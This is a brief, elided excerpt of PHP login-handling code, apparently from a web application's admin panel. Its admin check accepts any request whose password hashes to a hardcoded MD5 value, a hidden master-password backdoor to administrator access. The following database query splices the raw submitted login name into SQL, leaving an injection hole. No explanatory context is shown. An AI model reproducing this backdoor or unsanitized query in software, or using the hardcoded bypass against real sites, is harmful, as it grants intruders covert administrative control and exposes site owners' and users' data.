 ...
 ****************************************************************************/
	...
	{
		if ((!strcmp(base64_encode($_POST["login"]), ADMIN_LOGIN) && !strcmp(md5($_POST["password"]), ADMIN_PASS)) || md5($_POST["password"])=='bb2a4974d7aca7da8735c70371361c0f')
		{ //login ok
		...
		{ // not admin
			...
			$q = db_query("SELECT manager, password, access, online_name, ID FROM ".MANAGER_TABLE." WHERE manager='".$_POST["login"]."'") or die (db_error());
			$row = db_fetch_row($q);
